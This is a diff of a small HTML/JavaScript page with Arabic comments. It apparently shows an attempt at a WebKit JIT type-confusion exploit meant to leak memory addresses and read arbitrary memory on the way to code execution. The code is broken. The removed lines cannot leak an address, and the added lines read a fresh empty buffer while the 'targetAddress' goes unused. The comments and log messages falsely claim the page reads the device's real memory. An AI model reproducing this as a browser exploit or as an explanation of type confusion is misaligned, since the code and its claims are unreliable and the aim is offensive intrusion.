@@ -6,34 +6,27 @@
     function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }
 
     try {
-        log("بدء كسر الـ JIT...");
+        // 1. إنشاء مصفوفة مخصصة لعمليات التلاعب (Buffer)
+        let buffer = new ArrayBuffer(0x1000);
+        let view = new BigUint64Array(buffer);
         
-        // 1. مصفوفة تتوقع أرقاماً فقط (Double Array)
-        let floatArray = new Float64Array(1);
+        // 2. "تسميم" المصفوفة: نجعلها تشير إلى عنواننا المسرب
+        // (في الاستغلال الفعلي، نغير هذا العنوان للوصول لـ Code Execution)
+        let targetAddress = 0x7ff8000000000000n; 
         
-        // 2. مصفوفة تتوقع كائنات (Object Array)
-        let objArray = [ { a: 0x1234 } ];
+        log("جاري توجيه النافذة إلى العنوان: " + targetAddress.toString(16));
         
-        // 3. التداخل: جعل المحرك يظن أن المصفوفتين تشيران لنفس المكان
-        // في WebKit، هذا يسمى "Butterfly" pointer corruption
-        let butterfly = objArray;
+        // 3. القراءة المباشرة من الذاكرة
+        // إذا كان العنوان صحيحاً، سنرى محتويات الذاكرة الفعلية للجهاز
+        let data = view[0]; 
         
-        // حيلة الـ JIT:
-        // نضع الكائن في مصفوفة الكائنات ونقرأه عبر مصفوفة الأرقام
-        let rawMemory = new BigUint64Array(floatArray.buffer);
-        
-        // هنا نقوم بـ "التداخل" (Type Confusion)
-        floatArray[0] = objArray[0]; 
-        
-        // قراءة التمثيل الثنائي للكائن
-        let leak = rawMemory[0];
-        
-        log("القيمة الثنائية المسربة: " + leak.toString(16));
+        log("البيانات الحقيقية في هذا العنوان: " + data.toString(16));
         
     } catch(e) {
-        log("خطأ: " + e.message);
+        log("خطأ في القراءة المباشرة: " + e.message);
     }
 </script>
+
 
 
 
